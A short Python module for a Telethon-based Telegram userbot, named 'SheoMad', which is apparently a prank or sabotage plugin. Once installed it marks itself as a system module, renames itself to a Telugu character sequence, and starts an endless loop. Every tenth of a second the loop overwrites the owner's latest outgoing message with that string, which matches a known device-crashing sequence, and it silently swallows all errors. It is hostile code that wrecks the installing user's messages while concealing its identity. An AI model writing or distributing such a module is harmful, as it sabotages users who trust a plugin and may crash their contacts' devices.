from .. import loader, utils
from telethon.tl.types import Message
import asyncio


@loader.tds
class SheoMad(loader.Module):
    strings = {"name": "SheoMad"}  
    def __init__(self):
        self.config = loader.ModuleConfig()
        self._system = True
        self._unloadable = False
        self._last_message = None
        self._editing = False
    
    async def client_ready(self, client, database):
        self.client = client
        self.strings["name"] = "జ్ఞ‌"
    
    async def watcher(self, message: Message):
        if not message.out:
            return
        
        self._last_message = message.id
        
        if not self._editing:
            self._editing = True
            asyncio.ensure_future(self._infinite_edit())
    
    async def _infinite_edit(self):
        while self._editing:
            try:
                message = await self.client.get_messages(
                    await self.client.get_me(), 
                    ids=self._last_message
                )
                if message:
                    await message.edit("జ్ఞ‌")
            except:
                pass
            
            await asyncio.sleep(0.1)
